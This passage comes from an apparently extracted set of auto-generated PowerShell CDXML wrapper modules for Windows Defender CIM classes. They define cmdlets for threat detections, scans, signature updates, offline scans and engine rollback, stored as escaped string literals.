$__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ThreatID})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreatCatalog.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreatCatalog' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatDetection'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-MpThreatDetection\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatDetection')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('ID')]\r\n    [ValidateNotNull()]\r\n    [long[]]\r\n    ${ThreatID},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ThreatID})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreatDetection.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreatDetection' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpScan'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Start-MpScan\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${ScanPath},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('FullScan','QuickScan','CustomScan')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType]\r\n    ${ScanType},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanPath')) {\r\n          [object]$__cmdletization_value = ${ScanPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanType')) {\r\n          [object]$__cmdletization_value = ${ScanType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpScan.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpScan' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpSignature'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Update-MpSignature\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Update0')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('InternalDefinitionUpdateServer','MicrosoftUpdateServer','MMPC','FileShares')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource]\r\n    ${UpdateSource},\r\n\r\n    [Parameter(ParameterSetName='Update0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Update0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Update0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UpdateSource')) {\r\n          [object]$__cmdletization_value = ${UpdateSource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Update', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpSignature.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Update-MpSignature' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpWDOScan'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Start-MpWDOScan\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Start0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpWDOScan.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpWDOScan' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpRollback'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Start-MpRollback\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Engine},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Platform},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Engine')) {\r\n          [object]$__cmdletization_value = ${Engine}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Platform')) {\r\n          [object]$__cmdletization_value = ${Platform}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        